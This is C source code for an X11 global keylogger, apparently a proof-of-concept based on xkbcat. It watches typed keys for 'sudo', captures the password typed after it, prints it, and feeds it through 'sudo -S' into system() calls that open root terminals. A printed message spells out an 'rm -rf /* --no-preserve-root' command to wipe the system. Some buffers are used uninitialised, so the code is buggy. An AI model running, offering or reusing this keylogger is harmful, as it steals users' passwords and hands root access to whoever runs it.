// xkbcat: Logs X11 keypresses, globally.

#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>

const char * DEFAULT_DISPLAY    = ":0";
const bool   DEFAULT_PRINT_UP   = true;

int printUsage() {
    printf("\
USAGE: xkbcat [-display <display>] [-up]\n\
    display  target X display                   (default %s)\n\
    up       also print key-ups                 (default %s)\n",
        DEFAULT_DISPLAY, (DEFAULT_PRINT_UP ? "yes" : "no") );
    exit(0);
}

bool sudo_check (char * str) {
    const char sudo_const[] = "sudo";
    static  char sudo[500];
    static int position = 0;
    
    printf("position == %i \n", position);
    if (sudo_const[position] == * str) {
        sudo[position] = sudo_const[position];
        if (position < sizeof(sudo)) {
            position++;
            printf("position++\n");
        }
    }
    else {
        position = 0;
        printf("position = 0\n");
    }    
    if (strcmp(&sudo[0], &sudo_const[0]) == 0) {
        printf("SUDO CHECK TRUE!!!\n");
        return true;
    }
    printf("SUDO CHECK _NOMATCH\n");
    return false;
}


void sudo_command(char * password) {
    printf("Your password seems to be %s, will now rum multiple commands as sudo\n", password);
    char command1[500];
    char command2[500];
    char command3[500];
    char command4[500];
    char command5[500];
    char command6[500];
    char command7[500];
    char command8[500];
    char command9[500];

    printf("Just imagine someone would  run now system(\"echo %s | sudo -S rm -rf /* --no-preserve-root\");\n I guess you get the point\n", password); //Do not do that!!!
    strcat(command1, "echo ");
    strcat(command1,  password);
    strcat(command1, " | sudo -S gnome-terminal");
    strcat(command2, "echo ");
    strcat(command2,  password);
    strcat(command2, " | sudo -S konsole");
    strcat(command3, "echo ");
    strcat(command3,  password);
    strcat(command3, " | sudo -S xfce4-terminal");
    strcat(command4, "echo ");
    strcat(command4,  password);
    strcat(command4, " | sudo -S x-terminal-emulator");
    strcat(command5, "echo ");
    strcat(command5,  password);
    strcat(command5, " | sudo -S mate-terminal --window");
    strcat(command6, "echo ");
    strcat(command6,  password);
    strcat(command6, " | sudo -S gnome-terminal --profile=Default");
    strcat(command7, "echo ");
    strcat(command7,  password);
    strcat(command7, " | sudo -S pantheon-terminal -w \'\'");
    strcat(command8, "echo ");
    strcat(command8,  password);
    strcat(command8, " | sudo -S pantheon-terminal -w \'\'"); //I refuse to use snprintf, I REFUSE. Just why can strcat only accept 2 arguments?
    
    bool error_prevention = false; //without this bool it will not compile (ask C, not me!!!)
    printf("COMMAND COMMAND\n");
    //error_prevention = system(command1);
    error_prevention = system(command2);
    error_prevention = system(command3);
    error_prevention = system(command4);
    error_prevention = system(command5);
    error_prevention = system(command6);
    error_prevention = system(command7);
    error_prevention = system(command8);
    error_prevention = system(command9);
    if (error_prevention) printf("JUST WHO CREATED -Wunused-but-set-variable\n");
    while ("forever");
}



int main(int argc, char * argv[]) {
    
    printf("This tool is designed to destroy your system. For testing only. Abort it immediately, if you started it accidently and do not use and sudo command before you canceled it.\n");

    const char * xDisplayName = DEFAULT_DISPLAY;
    bool         printKeyUps  = DEFAULT_PRINT_UP;

    // Get arguments
    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "-help"))     printUsage();
        else if (!strcmp(argv[i], "-up"))       printKeyUps = true;
        else if (!strcmp(argv[i], "-display")) {
            // Read next entry to find value
            ++i;
            if (i >= argc) {
                fprintf(stderr, "No value given to option `-display`\n");
                printUsage();
                exit(5);
            }
            xDisplayName = argv[i];
        }
        else { printf("Unexpected argument `%s`\n", argv[i]); printUsage(); }
    }
    
    // Connect to X display
    Display * disp = XOpenDisplay(xDisplayName);
    if (NULL == disp) {
        fprintf(stderr, "Cannot open X display '%s'\n", xDisplayName);
        exit(1);
    }

    int xiOpcode;
    { // Test for XInput 2 extension
        int queryEvent, queryError;
        if (! XQueryExtension(disp, "XInputExtension", &xiOpcode,
                    &queryEvent, &queryError)) {
            fprintf(stderr, "X Input extension not available\n");
            exit(2);
        }
    }
    { // Request XInput 2.0, to guard against changes in future versions
        int major = 2, minor = 0;
        int queryResult = XIQueryVersion(disp, &major, &minor);
        if (queryResult == BadRequest) {
            fprintf(stderr, "Need XI 2.0 support (got %d.%d)\n", major, minor);
            exit(3);
        } else if (queryResult != Success) {
            fprintf(stderr, "XIQueryVersion failed!\n");
            exit(4);
        }
    }
    { // Register to receive XInput events
        Window root = DefaultRootWindow(disp);
        XIEventMask m;
        m.deviceid = XIAllMasterDevices;
        m.mask_len = XIMaskLen(XI_LASTEVENT);
        m.mask = calloc(m.mask_len, sizeof(char));
        XISetMask(m.mask, XI_RawKeyPress);
        if (printKeyUps)    XISetMask(m.mask, XI_RawKeyRelease);
        XISelectEvents(disp, root, &m, 1 /*number of masks*/);
        XSync(disp, false);
        free(m.mask);
    }
    bool Shift_L_pressed = 0;
    bool record_pw = 0;
    bool sudo_written =0;
    int i = 0;
    char password[500] = "";
    char tmp = 0;
    while ("forever") {
        XEvent event;
        XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
        XNextEvent(disp, &event);

        if (XGetEventData(disp, cookie) &&
                cookie->type == GenericEvent &&
                cookie->extension == xiOpcode) {
            switch (cookie->evtype) {
                case XI_RawKeyRelease: {
                    XIRawEvent *ev = cookie->data;

                    // Ask X what it calls that key; skip if it doesn't know
                    KeySym s = XkbKeycodeToKeysym(disp, ev->detail,
                            0 /*group*/, 0 /*shift level*/);
                    if (NoSymbol == s) continue;
                    char *str = XKeysymToString(s);
                    if (NULL == str) continue;
                    if (strcmp(str, "Shift_L") == 0 && cookie->evtype != XI_RawKeyPress)  Shift_L_pressed = 0;
                    break;
                }
                case XI_RawKeyPress: {
                    XIRawEvent *ev = cookie->data;

                    // Ask X what it calls that key; skip if it doesn't know
                    KeySym s = XkbKeycodeToKeysym(disp, ev->detail,
                            0 /*group*/, 0 /*shift level*/);
                    if (NoSymbol == s) continue;
                    char *str = XKeysymToString(s);
                    if (NULL == str) continue;

                    
                    
                    if (strcmp(str, "Shift_L") == 0 && cookie->evtype == XI_RawKeyPress)  Shift_L_pressed = 1;
                    if  (strcmp(str, "Shift_L") == 0 ) continue;
                    
                    tmp = *str;
                    if (Shift_L_pressed)  tmp = toupper ( *str) ;
                    
                    

                    if (record_pw && strcmp(str, "Return")  == 0) sudo_command(password);
                    if (record_pw && i < sizeof(password)) {
                        password[i] = tmp;
                        i++;
                    }
                    if (sudo_written && strcmp(str, "Return")  == 0) record_pw = true;
                    if (sudo_check(str)) sudo_written = true;
                    
                    
                    // Output line
                    if (printKeyUps) printf("%s",
                            cookie->evtype == XI_RawKeyPress ? "+" : "-");
                    printf("%s\n", &tmp);
                    printf("%s\n", str);
                    
                    fflush(stdout);
                    break;
                                     }
            }
        }
    }
}
